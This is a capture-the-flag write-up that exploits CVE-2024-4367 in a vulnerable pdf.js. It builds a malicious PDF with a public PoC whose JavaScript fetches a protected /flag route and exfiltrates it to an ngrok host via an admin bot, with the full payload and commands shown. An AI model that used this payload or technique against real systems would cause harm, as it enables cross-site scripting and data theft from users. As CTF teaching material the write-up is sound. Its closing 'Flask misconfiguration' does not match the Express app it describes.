# Upload

## Table of Contents

1. [Overview](#overview)
2. [Background](#background)
3. [Enumeration](#enumeration)
4. [Exploitation](#exploitation)
5. [Conclusion](#conclusion)

## Overview

- Solved by: @siunam
- 158 solves / 100 points
- Author: @S0nG0ku
- Overall difficulty for me (From 1-10 stars): ★☆☆☆☆☆☆☆☆☆

## Background

Navigate a mysterious file upload journey.

chall: [http://172.206.89.197:9000/](http://172.206.89.197:9000/)

bot: [http://172.206.89.197:9000/report](http://172.206.89.197:9000/report)

Author: **@S0nG0ku**

![](https://github.com/siunam321/CTF-Writeups/blob/main/Akasec-CTF-2024/images/Pasted%20image%2020240610125457.png)

## Enumeration

**Index page:**

![](https://github.com/siunam321/CTF-Writeups/blob/main/Akasec-CTF-2024/images/Pasted%20image%2020240610125820.png)

Hmm... It seems empty in here. Let's try to create a new account via the "Signup" page:

![](https://github.com/siunam321/CTF-Writeups/blob/main/Akasec-CTF-2024/images/Pasted%20image%2020240610125934.png)

Upon signing up a new account, it redirected us to the "Login" page:

![](https://github.com/siunam321/CTF-Writeups/blob/main/Akasec-CTF-2024/images/Pasted%20image%2020240610130020.png)

After logging in, we'll met with the **upload page**:

![](https://github.com/siunam321/CTF-Writeups/blob/main/Akasec-CTF-2024/images/Pasted%20image%2020240610130030.png)

Uh... Let's try to upload a file for testing:

```shell
┌[siunam♥Mercury]-(~/Downloads)-[2024.06.10|13:01:16(HKT)]
└> echo -n 'test' > test.txt                     
```

![](https://github.com/siunam321/CTF-Writeups/blob/main/Akasec-CTF-2024/images/Pasted%20image%2020240610130154.png)

![](https://github.com/siunam321/CTF-Writeups/blob/main/Akasec-CTF-2024/images/Pasted%20image%2020240610130208.png)

Hmm... It **only accepts `.pdf` format**...

Burp Suite HTTP history:

![](https://github.com/siunam321/CTF-Writeups/blob/main/Akasec-CTF-2024/images/Pasted%20image%2020240610130321.png)

When we clicked the "Upload" button, it'll send a POST request to **`/upload`** with form data parameter `file`.

Now, let's try to **upload a [sample PDF file](https://pdfobject.com/pdf/sample.pdf)** and see what will happened:

![](https://github.com/siunam321/CTF-Writeups/blob/main/Akasec-CTF-2024/images/Pasted%20image%2020240610130634.png)

After uploading a sample PDF file, it'll redirect us to `/view/file-<epoch_time>.<file_extension>` and render the uploaded PDF file.

There's no much we can do in here. Let's read this web application's source code!

**In this challenge, we can download a [file](https://github.com/siunam321/CTF-Writeups/blob/main/Akasec-CTF-2024/Web/Upload/upload.zip):**
```shell
┌[siunam♥Mercury]-(~/ctf/Akasec-CTF-2024/Web/Upload)-[2024.06.10|13:08:26(HKT)]
└> file upload.zip 
upload.zip: Zip archive data, at least v2.0 to extract, compression method=store
┌[siunam♥Mercury]-(~/ctf/Akasec-CTF-2024/Web/Upload)-[2024.06.10|13:08:26(HKT)]
└> unzip upload.zip 
Archive:  upload.zip
   creating: upload/
  inflating: upload/app.js           
  inflating: upload/bot.js           
  inflating: upload/Dockerfile       
   creating: upload/img/
 extracting: upload/img/img.jpg      
  inflating: upload/package-lock.json  
  inflating: upload/package.json     
   creating: upload/views/
  inflating: upload/views/bot.ejs    
  inflating: upload/views/index.ejs  
  inflating: upload/views/login.ejs  
  inflating: upload/views/signup.ejs  
  inflating: upload/views/upload.ejs  
  inflating: upload/views/view.ejs   
```

After reviewing the source code, we have the following findings!

**First, the flag is at route `/flag`:**
```javascript
const express = require('express');
[...]
const app = express();
[...]
app.get('/flag', (req, res) => {
  let ip = req.connection.remoteAddress;
  if (ip === '127.0.0.1') {
    res.json({ flag: 'AKASEC{FAKE_FLAG}' });
  } else {
    res.status(403).json({ error: 'Access denied' });
  }
});
[...]
```

To get the flag however, **the remote address must be `127.0.0.1`**.

Luckily, there's a bot that sends request to our given URL!

**At POST route `/report`, it'll parse `url` POST parameter to the bot:**
```javascript
[...]
const bot = require("./bot")
[...]
app.post("/report", limit, async (req, res) => {
    const { url } = req.body;
    if (!url) {
        return res.status(400).send({ error: "Url is missing." });
    }
    if (!RegExp(bot.urlRegex).test(url)) {
        return res.status(422).send({ error: "URL din't match this regex format " + bot.urlRegex })
    }
    if (await bot.bot(url)) {
        return res.send({ success: "Admin successfully visited the URL." });
    } else {
        return res.status(500).send({ error: "Admin failed to visit the URL." });
    }
});
[...]
```

**`bot.js`:**
```javascript
const puppeteer = require('puppeteer');

const CONFIG = {
    [...]
    APPURL: process.env['APPURL'] || "http://127.0.0.1:5000",
    [...]
}
[...]
const initBrowser = puppeteer.launch({
    executablePath: "/usr/bin/chromium-browser",
    headless: true,
    [...]
});
[...]
module.exports = {
    [...]
    urlRegex: `^${CONFIG.APPURL}/.*$`,
    [...]
    bot: async (urlToVisit) => {
        const browser = await initBrowser;
        const context = await browser.createBrowserContext()
        try {
            // Goto main page
            const page = await context.newPage();
            // Visit URL from user
            console.log(`bot visiting ${urlToVisit}`)
            await page.goto(urlToVisit, {
                waitUntil: 'networkidle2'
            });
            await sleep(8000);
            cookies = await page.cookies()
            console.log(cookies);

            // Close
            console.log("browser close...")
            await context.close()
            return true;
        } catch (e) {
            console.error(e);
            await context.close();
            return false;
        }
    }
}
```

In here, the when `bot` module's function `bot` is called, it'll launch a [headless](https://en.wikipedia.org/wiki/Headless_browser) Chromium browser, and go to our given URL (`http://127.0.0.1:5000/<our_URL>`)

That being said, we can send a **POST request to `/report`** with the URL **`http://127.0.0.1:5000/flag`** to get the flag?

Well then how can we exfiltrate the flag?

To do so, we can find a client-side vulnerability, such as **XSS (Cross-Site Scripting)**, to exfiltrate the flag.

**Maybe the PDF rendering is vulnerable to XSS?**
```javascript
[...]
const PDFJS = require('pdfjs-dist');
[...]
app.use('/pdf.js', express.static(path.join(__dirname, 'node_modules/pdfjs-dist/build/pdf.js')));
app.use('/pdf.worker.js', express.static(path.join(__dirname, 'node_modules/pdfjs-dist/build/pdf.worker.js')));

app.get('/view/:filename', async (req, res) => {
    let filename = req.params.filename;
    res.render('view', { filename: filename });
});
[...]
```

**`views/view.ejs`:**
```html
    [...]
    <script src="/pdf.js"></script>
    <script>
        var url = '/uploads/<%= filename %>';

        var pdfjsLib = window['pdfjsLib'];

        pdfjsLib.GlobalWorkerOptions.workerSrc = '/pdf.worker.js';

        var loadingTask = pdfjsLib.getDocument(url);
        loadingTask.promise.then(function(pdf) {

            var pageNumber = 1;
            pdf.getPage(pageNumber).then(function(page) {
                var scale = 1.5;
                var viewport = page.getViewport({scale: scale});

                var canvas = document.getElementById('the-canvas');
                var context = canvas.getContext('2d');
                canvas.height = viewport.height;
                canvas.width = viewport.width;

                var renderContext = {
                    canvasContext: context,
                    viewport: viewport
                };
                var renderTask = page.render(renderContext);
                renderTask.promise.then(function () {
                    console.log('Page rendered');
                });
            });
        }, function (reason) {
            console.error(reason);
        });
    </script>
    [...]
```

In here, we can see that the route `/view/:filename` returns the `views/view.ejs` template. In this template, it imports the `/pdf.js` JavaScript file, which is the NodeJS module **`pdfjs-dist`**, and uses that module to **render** our uploaded PDF file!

Huh... Recently, I saw a [tweet](https://twitter.com/albinowax/status/1792568684713500935) on Twitter (X) about a vulnerability in PDF.js (CVE-2024-4367). I'm not sure the `/pdf.js` on this web application is vulnerable to that CVE.

**Let's check it with `npm audit`!**
```shell
┌[siunam♥Mercury]-(~/ctf/Akasec-CTF-2024/Web/Upload)-[2024.06.10|13:34:00(HKT)]
└> cd upload  
┌[siunam♥Mercury]-(~/ctf/Akasec-CTF-2024/Web/Upload/upload)-[2024.06.10|13:34:03(HKT)]
└> npm audit                  
# npm audit report

nedb  *
Severity: critical
Prototype Pollution in nedb - https://github.com/advisories/GHSA-339j-hqgx-qrrx
Depends on vulnerable versions of binary-search-tree
Depends on vulnerable versions of underscore
No fix available
node_modules/nedb

pdfjs-dist  <=4.1.392
Severity: high
PDF.js vulnerable to arbitrary JavaScript execution upon opening a malicious PDF - https://github.com/advisories/GHSA-wgrm-67xf-hhpq
fix available via `npm audit fix --force`
Will install pdfjs-dist@4.3.136, which is a breaking change
node_modules/pdfjs-dist

underscore  1.3.2 - 1.12.0
Severity: critical
Arbitrary Code Execution in underscore - https://github.com/advisories/GHSA-cf4h-3jhx-xvhq
No fix available
node_modules/underscore
  binary-search-tree  *
  Depends on vulnerable versions of underscore
  node_modules/binary-search-tree

4 vulnerabilities (1 high, 3 critical)
[...]
```

Oh! Looks like this web application is indeed using the vulnerable `pdf.js`!

In the [GitHub advisory](https://github.com/advisories/GHSA-wgrm-67xf-hhpq), the description said:

> If pdf.js is used to load a malicious PDF, and PDF.js is configured with `isEvalSupported` set to `true` (which is the default value), unrestricted attacker-controlled JavaScript will be executed in the context of the hosting domain.

In the "CVE ID" section, we can also see that it is the exact same CVE ID!

![](https://github.com/siunam321/CTF-Writeups/blob/main/Akasec-CTF-2024/images/Pasted%20image%2020240610133740.png)

## Exploitation

Let's search for public exploit, like PoC (Proof-of-Concept)!

By Googling the CVE ID, we can find [this PoC](https://github.com/LOURC0D3/CVE-2024-4367-PoC):

![](https://github.com/siunam321/CTF-Writeups/blob/main/Akasec-CTF-2024/images/Pasted%20image%2020240610133826.png)

**Let's download the PoC Python script!**
```shell
┌[siunam♥Mercury]-(~/ctf/Akasec-CTF-2024/Web/Upload)-[2024.06.10|13:42:30(HKT)]
└> wget https://raw.githubusercontent.com/LOURC0D3/CVE-2024-4367-PoC/main/CVE-2024-4367.py
[...]
```

**In that GitHub repository, the PoC usage is like this:**
```bash
python3 CVE-2024-4367.py "alert(document.domain)"
```

**Let's try to popup an alert box!**
```shell
┌[siunam♥Mercury]-(~/ctf/Akasec-CTF-2024/Web/Upload)-[2024.06.10|13:43:47(HKT)]
└> python3 CVE-2024-4367.py "alert(document.domain)"
[+] Created malicious PDF file: poc.pdf
[+] Open the file with the vulnerable application to trigger the exploit.
┌[siunam♥Mercury]-(~/ctf/Akasec-CTF-2024/Web/Upload)-[2024.06.10|13:43:54(HKT)]
└> file poc.pdf          
poc.pdf: PDF document, version 1.4, 1 page(s)
```

Then upload it:

![](https://github.com/siunam321/CTF-Writeups/blob/main/Akasec-CTF-2024/images/Pasted%20image%2020240610134449.png)

Nice! We can confirm that this web application is vulnerable to CVE-2024-4367!

Now, let's host a web server to receive the exfiltrated flag! To do so, I'll be using Python's `http.server`:

```shell
┌[siunam♥Mercury]-(~/ctf/Akasec-CTF-2024/Web/Upload)-[2024.06.10|14:16:11(HKT)]
└> python3 -m http.server 80
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
```

Then, I'll use Ngrok to do port forwarding:

```shell
┌[siunam♥Mercury]-(~/ctf/Akasec-CTF-2024/Web)-[2024.06.10|14:16:56(HKT)]
└> ngrok http 80 --response-header-add="Access-Control-Allow-Origin:*"
[...]
Forwarding                    https://fa9e-{REDACTED}.ngrok-free.app -> http://localhost:80            
[...]
```

> Note: The `Access-Control-Allow-Origin` response header is needed, otherwise the bot can't sends request to us because of the SOP (Same Origin Policy).

Next, modify the payload to get the flag!

```javascript
fetch("/flag")
  .then(response => response.json())
  .then(data => {
    const flag = encodeURIComponent(JSON.stringify(data));
    return fetch(`<NGROK_URL_HERE>?flag=${flag}`);
  })
```

In this payload, the bot will first get the flag at route `/flag`, then exfiltrate the flag to us.

Let's do this!

```shell
┌[siunam♥Mercury]-(~/ctf/Akasec-CTF-2024/Web/Upload)-[2024.06.10|13:51:51(HKT)]
└> python3 CVE-2024-4367.py 'fetch("/flag")
  .then(response => response.json())
  .then(data => {
    const flag = encodeURIComponent(JSON.stringify(data));
    return fetch(`https://fa9e-{REDACTED}.ngrok-free.app/?flag=${flag}`);
  })'
[+] Created malicious PDF file: poc.pdf
[+] Open the file with the vulnerable application to trigger the exploit.
```

Upload the `poc.pdf`, jot down the uploaded filename, and send a POST request to `/report` and let the bot trigger our XSS payload:

```http
POST /report HTTP/1.1
Host: 172.206.89.197:9000
Content-Type: application/x-www-form-urlencoded
Content-Length: 53

url=http://127.0.0.1:5000/view/file-1718000341478.pdf
```

![](https://github.com/siunam321/CTF-Writeups/blob/main/Akasec-CTF-2024/images/Pasted%20image%2020240610142045.png)

**Finally, we should be able to get the flag!**
```shell
[...]
127.0.0.1 - - [10/Jun/2024 14:20:02] "GET /?flag=%7B%22flag%22%3A%22AKASEC%7BPDF_1s_4w3s0m3_W1th_XSS_%26%26_Fr33_P4le5T1n3_r0t4t333d_loooool%7D%22%7D HTTP/1.1" 200 -
127.0.0.1 - - [10/Jun/2024 14:20:02] "GET /?flag=%7B%22flag%22%3A%22AKASEC%7BPDF_1s_4w3s0m3_W1th_XSS_%26%26_Fr33_P4le5T1n3_r0t4t333d_loooool%7D%22%7D HTTP/1.1" 200 -
[...]
```

**URL decoded:**
```json
{"flag":"AKASEC{PDF_1s_4w3s0m3_W1th_XSS_&&_Fr33_P4le5T1n3_r0t4t333d_loooool}"}
```

- **Flag: `AKASEC{PDF_1s_4w3s0m3_W1th_XSS_&&_Fr33_P4le5T1n3_r0t4t333d_loooool}`**

## Conclusion

What we've learned:

1. Flask misconfiguration